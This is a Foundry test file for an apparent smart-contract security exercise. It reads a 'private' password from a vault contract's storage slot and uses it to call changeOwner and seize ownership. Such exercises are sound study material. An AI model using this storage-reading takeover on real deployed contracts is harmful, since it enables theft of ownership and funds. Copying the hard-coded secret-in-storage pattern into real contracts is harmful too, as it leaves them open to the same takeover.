pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../AttackVault.sol";

contract AttackVaultTest is Test {
    VaultLogic public vaultLogic;
    Vault public vault;
    StorageReader public reader;
    bytes32 private constant PASSWORD = "mypassword";

    function setUp() public {
        // 部署合约
        vaultLogic = new VaultLogic(PASSWORD);
        vault = new Vault(address(vaultLogic));
        reader = new StorageReader();

        // 打印合约地址便于调试
        console.log("VaultLogic deployed at:", address(vaultLogic));
        console.log("Vault deployed at:", address(vault));
    }

    function testReadPrivatePassword() public {
        // 读取VaultLogic的storage
        bytes32 slot0 = reader.readStorage(address(vaultLogic), 0); // owner
        bytes32 slot1 = reader.readStorage(address(vaultLogic), 1); // password
        
        console.log("Slot 0 (owner):");
        console.logBytes32(slot0);
        console.log("Slot 1 (password):");
        console.logBytes32(slot1);

        // 验证读取的password是否正确
        assertEq(slot1, PASSWORD);

        // 尝试使用读取到的password改变owner
        address newOwner = makeAddr("newOwner");
        vaultLogic.changeOwner(slot1, newOwner);
        
        // 验证owner是否被成功改变
        assertEq(vaultLogic.owner(), newOwner);
    }
}
